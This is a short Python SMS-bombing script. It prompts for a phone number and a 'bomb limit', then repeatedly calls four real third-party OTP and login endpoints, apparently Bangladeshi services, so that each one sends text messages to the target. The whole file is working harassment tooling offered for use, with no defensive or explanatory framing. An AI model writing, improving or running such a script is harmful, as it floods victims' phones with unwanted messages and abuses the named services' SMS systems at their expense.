import urllib.parse
import requests
from requests.exceptions import RequestException
from urllib3.exceptions import MaxRetryError

def send_sms(phone_number, bomb_limit):
    try:
        response_data = {}

        # Send request to each API based on the bomb limit
        for i in range(bomb_limit):
            # Send request to first API
            first_api_url = f"https://www.teamdccs.xyz/sms.php?number={urllib.parse.quote(phone_number)}"
            try:
                response = requests.get(first_api_url).text
            except RequestException as e:
                response_data[f"First API - Request {i+1}"] = f"Error: {str(e)}"
            else:
                response_data[f"First API - Request {i+1}"] = response

            # Send request to second API
            second_api_url = "https://apix.rabbitholebd.com/appv2/login/requestOTP"
            second_api_payload = {"mobile": phone_number}
            second_api_headers = {"Content-Type": "application/json"}
            try:
                second_api_response = requests.post(second_api_url, json=second_api_payload, headers=second_api_headers).json()
            except RequestException as e:
                response_data[f"Second API - Request {i+1}"] = f"Error: {str(e)}"
            else:
                response_data[f"Second API - Request {i+1}"] = second_api_response

            # Send request to third API
            third_api_url = "http://nesco.sslwireless.com/api/v1/login"
            third_api_payload = {"phone_number": phone_number}
            third_api_headers = {"Content-Type": "application/json"}
            try:
                third_api_response = requests.post(third_api_url, json=third_api_payload, headers=third_api_headers).json()
            except (RequestException, MaxRetryError) as e:
                response_data[f"Third API - Request {i+1}"] = f"Error: {str(e)}"
            else:
                response_data[f"Third API - Request {i+1}"] = third_api_response

            # Send request to fourth API
            formatted_phone_number = "+88" + phone_number
            fourth_api_url = "https://api3.bioscopelive.com/auth/api/login/send-otp"
            fourth_api_payload = {"operator": "all", "msisdn": formatted_phone_number}
            fourth_api_headers = {"Content-Type": "application/json"}
            try:
                fourth_api_response = requests.post(fourth_api_url, json=fourth_api_payload, headers=fourth_api_headers).json()
            except RequestException as e:
                response_data[f"Fourth API - Request {i+1}"] = f"Error: {str(e)}"
            else:
                response_data[f"Fourth API - Request {i+1}"] = fourth_api_response

        print("Status:")
        for api_name, api_response in response_data.items():
            print(f"{api_name} Response: {api_response}")

    except RequestException as e:
        print(f"An error occurred during API request: {str(e)}")


if __name__ == '__main__':
    phone_number = input("Enter the phone number: ")
    bomb_limit = int(input("Enter the bomb limit: "))

    send_sms(phone_number, bomb_limit)
